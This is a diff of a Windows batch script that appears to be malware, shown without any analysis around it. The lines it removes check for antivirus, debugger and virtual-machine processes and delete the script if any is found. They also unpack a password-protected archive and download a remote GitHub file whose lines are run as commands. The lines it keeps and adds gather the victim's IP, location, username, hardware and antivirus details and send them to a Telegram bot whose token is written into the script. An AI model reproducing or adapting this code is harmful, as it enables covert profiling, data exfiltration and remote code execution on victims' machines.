@@ -1,70 +1,17 @@
 setlocal EnableDelayedExpansion
-
-if exist "%ProgramData%\AUX..\Input.exe" (
-    rd /s /q "%ProgramData%\dist"
-    del /f "%~f0"
-    exit /b
-)
-
-set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe SandboxieRpcSs.exe SandboxieDcomLaunch.exe httpdebuggerui.exe wireshark.exe fiddler.exe vboxservice.exe df5serv.exe vboxtray.exe vmtoolsd.exe vmwaretray.exe ida64.exe ollydbg.exe pestudio.exe vmwareuser.exe vgauthservice.exe vmacthlp.exe vmsrvc.exe x32dbg.exe x64dbg.exe x96dbg.exe vmusrvc.exe prl_cc.exe prl_tools.exe qemu-ga.exe joeboxcontrol.exe ksdumperclient.exe xenservice.exe joeboxserver.exe devenv.exe immunitydebugger.exe windbg.exe 32dbg.exe 64dbg.exe protection_id.exe scylla_x86.exe scylla_x64.exe scylla.exe idau64.exe idaq64.exe"
-
-for %a in (%processList%) do (
-    tasklist /FI "IMAGENAME eq %a" 2>NUL | find /I "%a" >NUL
-    if not errorlevel 1 (
-        rd /s /q "%ProgramData%\dist"
-        del /f "%~f0"
-        exit /b
-    )
-)
-
-"%ProgramData%\dist\UnRAR.exe" x -y -p147852369 "%ProgramData%\dist\51654.rar" "%ProgramData%\dist\"
-powershell.exe -C "$c = (iwr 'https://raw.githubusercontent.com/githa0/0/0/0/confrus' -UseBasicParsing).Content; foreach ($line in $c -split \"`n\") { cmd /c $line }"
-
-setlocal EnableDelayedExpansion
 set "TOKEN=7615353876:AAF-Mcj1DDxs85m-pU4fAIR34jJ1r8y7p54"
 set "CHAT_ID=5674938532"
 
-for /f "tokens=1,* delims=|" %a in ('
-  powershell -NoProfile -Command ^
-    "$json = Invoke-RestMethod -Uri 'http://ip-api.com/json/';" ^
-    "Write-Host ($json.query + '|' + $json.country)"
-') do (
-    set "IP=%a"
-    set "Country=%b"
-)
-
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_OperatingSystem).Caption"') do (
-    set "Windows=%a"
-)
-
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_Processor).Name"') do (
-    set "CPU=%a"
-)
-
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Class Win32_VideoController).Caption"') do (
-    set "GPU=%a"
-)
-
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "[System.Environment]::Is64BitOperatingSystem"') do (
-    if %a==True (
-        set "Arch=X64"
-    ) else (
-        set "Arch=X86"
-    )
-)
-
-for /f "tokens=*" %a in ('powershell -NoProfile -Command "(Get-WmiObject -Namespace root/SecurityCenter2 -Class AntiVirusProduct).displayName"') do (
-    if defined Antivirus (
-        set "Antivirus=!Antivirus!,%a"
-    ) else (
-        set "Antivirus=%a"
-    )
-)
-
+for /f "tokens=1,2 delims=," %a in ('curl -s "http://ip-api.com/csv/?fields=country,query"') do (set "Country=%a" & set "IP=%b" & echo Country: !Country! & echo IP: !IP!)
+for /f "tokens=2 delims==" %a in ('wmic os get Caption /value') do set "Windows=%a"
+for /f "tokens=2 delims==" %a in ('wmic cpu get name /value') do set "CPU=%a"
+for /f "tokens=2 delims==" %a in ('wmic path win32_videocontroller get caption /value') do set "GPU=%a"
+set "Antivirus="
+for /f "tokens=2 delims==" %a in ('wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName /value') do (if defined Antivirus (set "Antivirus=!Antivirus!, %a") else (set "Antivirus=%a"))
+if defined ProgramFiles(x86) (set Arch=X64) else (set Arch=X86)
 set "UserName=%USERNAME%"
 set "Worker=%COMPUTERNAME%"
+set "MESSAGE=---**RUS**---%%0AIP: !IP!%%0ACountry: !Country!%%0AWorker: !Worker!%%0AUserName: !UserName!%%0AWindows: !Windows! !Arch!%%0ACPU: !CPU!%%0AGPU: !GPU!%%0AAntivirus: !Antivirus!"
 
-powershell -NoProfile -Command ^
-  "$message = 'RUS' + [System.Environment]::NewLine + 'IP: %IP%' + [System.Environment]::NewLine + 'Country: %Country%' + [System.Environment]::NewLine + 'Worker: %Worker%' + [System.Environment]::NewLine + 'UserName: %UserName%' + [System.Environment]::NewLine + 'Windows: %Windows% %Arch%' + [System.Environment]::NewLine + 'CPU: %CPU%' + [System.Environment]::NewLine + 'GPU: %GPU%' + [System.Environment]::NewLine + 'Antivirus: %Antivirus%';" ^
-  "Invoke-RestMethod -Uri 'https://api.telegram.org/bot%TOKEN%/sendMessage' -Method POST -Body @{chat_id='%CHAT_ID%'; text=$message}"
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=%MESSAGE%"
 endlocal
